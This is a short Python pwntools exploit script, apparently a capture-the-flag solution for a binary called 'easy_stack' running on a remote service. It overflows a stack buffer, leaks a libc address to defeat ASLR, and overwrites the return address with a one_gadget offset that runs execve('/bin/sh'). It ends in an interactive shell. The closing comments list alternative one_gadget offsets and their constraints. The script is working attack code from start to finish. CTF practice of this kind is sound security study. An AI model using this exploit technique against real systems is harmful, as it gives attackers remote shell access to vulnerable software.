from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./easy_stack")
io=remote("nc.eonew.cn",10004)
elf=ELF("./easy_stack")
libc=ELF("./libc-2.27.so")
# gdb.attach(io)
# pause()

payload=cyclic(0x88)+b"\x80"
io.sendline(payload)

leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x21a80
print("leak_addr: " + hex(leak_addr))

shell=leak_addr+0x415a6


payload=b"a"*0x88+p64(shell)
io.sendline(payload)

sleep(1)


io.interactive()
    


# 0x415a6 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x415fa execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xdfa51 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL
